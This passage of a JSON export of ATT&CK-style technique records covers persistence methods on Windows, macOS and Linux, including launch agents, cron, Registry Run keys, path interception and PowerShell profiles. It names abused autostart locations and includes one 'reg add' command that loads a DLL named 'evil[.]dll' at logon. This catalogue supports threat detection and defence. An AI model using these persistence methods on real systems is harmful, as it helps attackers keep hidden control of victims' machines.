11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":280,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":284,"name":"T1159 - Launch Agent","sort_id":0,"external_id":"T1159","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Per Apple\u2019s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>\/System\/Library\/LaunchAgents<\/code>, <code>\/Library\/LaunchAgents<\/code>, and <code>$HOME\/Library\/LaunchAgents<\/code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).<\/p>\n<p>Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user\u2019s directory structure) or when any user logs in (which requires administrator privileges).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":284,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":285,"name":"T1160 - Launch Daemon","sort_id":0,"external_id":"T1160","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Per Apple\u2019s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>\/System\/Library\/LaunchDaemons<\/code> and <code>\/Library\/LaunchDaemons<\/code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).<\/p>\n<p>Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software  (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.<\/p>\n<p>The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon\u2019s executable and gain persistence or Privilege Escalation.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":285,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":287,"name":"T1168 - Local Job Scheduling","sort_id":0,"external_id":"T1168","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task<\/a> on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).<\/p>\n<h3>cron<\/h3>\n<p>System-wide cron jobs are installed by modifying <code>\/etc\/crontab<\/code> file, <code>\/etc\/cron.d\/<\/code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.<\/p>\n<p>Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.<\/p>\n<h3>at<\/h3>\n<p>The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and\/or time, which could also be used for the same purposes.<\/p>\n<h3>launchd<\/h3>\n<p>Each launchd job is described by a different configuration property list (plist) file similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1160\">Launch Daemon<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1159\">Launch Agent<\/a>, except there is an additional key called <code>StartCalendarInterval<\/code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":287,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":287,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":288,"name":"T1162 - Login Item","sort_id":0,"external_id":"T1162","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's <code>~\/Library\/Preferences\/<\/code> directory in a plist file called <code>com.apple.loginitems.plist<\/code> (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don\u2019t all have to since there is an option to \u2018Hide\u2019 the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled <\/code> can be used to set Login Items, but scripting languages like <a href=\"https:\/\/attack.mitre.org\/techniques\/T1155\">AppleScript<\/a> can do this as well  (Citation: Adding Login Items).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":288,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":289,"name":"T1037 - Boot or Logon Initialization Scripts","sort_id":0,"external_id":"T1037","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  <\/p>\n<p>Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. <\/p>\n<p>An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":289,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":289,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":292,"name":"T1031 - Modify Existing Service","sort_id":0,"external_id":"T1031","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows service configuration information, including the file path to the service's executable or recovery programs\/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>.<\/p>\n<p>Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.<\/p>\n<p>Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs\/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":292,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":300,"name":"T1128 - Netsh Helper DLL","sort_id":0,"external_id":"T1128","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh<\/code>.<\/p>\n<p>Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe. (Citation: Demaske Netsh Persistence)<\/p>\n<p>Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. (Citation: Github Netsh Helper CS Beacon)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":300,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":306,"name":"T1050 - New Service","sort_id":0,"external_id":"T1050","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. <\/p>\n<p>Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a>. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1035\">Service Execution<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":306,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":308,"name":"T1137 - Office Application Startup","sort_id":0,"external_id":"T1137","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.<\/p>\n<p>A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.\n\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)\n\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https:\/\/attack.mitre.org\/software\/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":308,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":308,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":314,"name":"T1034 - Path Interception","sort_id":0,"external_id":"T1034","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)<\/p>\n<p>There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.<\/p>\n<h3>Unquoted Paths<\/h3>\n<p>Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe<\/code> vs. <code>&quot;C:\\safe path with space\\program.exe&quot;<\/code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe<\/code>, an adversary may create a program at <code>C:\\program.exe<\/code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)<\/p>\n<h3>PATH Environment Variable Misconfiguration<\/h3>\n<p>The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32<\/code> (e.g., <code>C:\\Windows\\system32<\/code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.<\/p>\n<p>For example, if <code>C:\\example path<\/code> precedes <code>C:\\Windows\\system32<\/code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path<\/code> will be called instead of the Windows system &quot;net&quot; when &quot;net&quot; is executed from the command-line.<\/p>\n<h3>Search Order Hijacking<\/h3>\n<p>Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.<\/p>\n<p>For example, &quot;example.exe&quot; runs &quot;cmd.exe&quot; with the command-line argument <code>net user<\/code>. An adversary may place a program called &quot;net.exe&quot; within the same directory as example.exe, &quot;net.exe&quot; will be run instead of the Windows system utility net. In addition, if an adversary places a program called &quot;net.com&quot; in the same directory as &quot;net.exe&quot;, then <code>cmd.exe \/C net user<\/code> will execute &quot;net.com&quot; instead of &quot;net.exe&quot; due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)<\/p>\n<p>Search order hijacking is also a common practice for hijacking DLL loads and is covered in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1038\">DLL Search Order Hijacking<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":314,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":319,"name":"T1013 - Port Monitors","sort_id":0,"external_id":"T1013","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32<\/code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors<\/code>. <\/p>\n<p>The Registry key contains entries for the following:<\/p>\n<ul>\n<li>Local Port<\/li>\n<li>Standard TCP\/IP Port<\/li>\n<li>USB Monitor<\/li>\n<li>WSD Port<\/li>\n<\/ul>\n<p>Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":319,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":321,"name":"T1504 - PowerShell Profile","sort_id":0,"external_id":"T1504","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may gain persistence and elevate privileges in certain situations by abusing <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a> profiles. A PowerShell profile  (<code>profile.ps1<\/code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments. PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) <\/p>\n<p>Adversaries may modify these profiles to include arbitrary commands, functions, modules, and\/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile<\/code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) <\/p>\n<p>An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":321,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":328,"name":"T1163 - Rc.common","sort_id":0,"external_id":"T1163","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>During the boot process, macOS executes <code>source \/etc\/rc.common<\/code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.<\/p>\n<p>Adversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":328,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":329,"name":"T1164 - Re-opened Applications","sort_id":0,"external_id":"T1164","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~\/Library\/Preferences\/com.apple.loginwindow.plist<\/code> and <code>~\/Library\/Preferences\/ByHost\/com.apple.loginwindow.* .plist<\/code>. <\/p>\n<p>An adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":329,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":331,"name":"T1060 - Registry Run Keys \/ Startup Folder","sort_id":0,"external_id":"T1060","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adding an entry to the &quot;run keys&quot; in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.<\/p>\n<p>The following run keys are created by default on Windows systems:<\/p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<\/code><\/li>\n<\/ul>\n<p>The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx<\/code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a &quot;Depend&quot; key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend \/v 1 \/d &quot;C:\\temp\\evil[.]dll&quot;<\/code> (Citation: Oddvar Moe RunOnceEx Mar 2018)<\/p>\n<p>The following Registry keys can be used to set startup folder items for persistence:<\/p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<\/code><\/li>\n<\/ul>\n<p>The following Registry keys can control automatic startup of services during boot:<\/p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<\/code><\/li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<\/code><\/li>\n<\/ul>\n<p>Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:<\/p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<\/code><\/li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<\/code><\/li>\n<\/ul>\n<p>The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit<\/code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell<\/code> subkeys can automatically launch programs.<\/p>\n<p>Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<\/code> run when any user logs on.<\/p>\n<p>By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager<\/code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.<\/p>\n<p>Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to make the Registry entries look as if they are associated with legitimate programs.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":331,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":351,"name":"T1180 - Screensaver","sort_id":0,"external_id":"T1180","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\<\/code>, and <code>C:\\Windows\\sysWOW64\\<\/code> on 64-bit Windows systems, along with screensavers included with base Windows installations. <\/p>\n<p>The following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\<\/code>) and could be manipulated to achieve persistence:<\/p>\n<ul>\n<li><code>SCRNSAVE.exe<\/code> - set to malicious PE 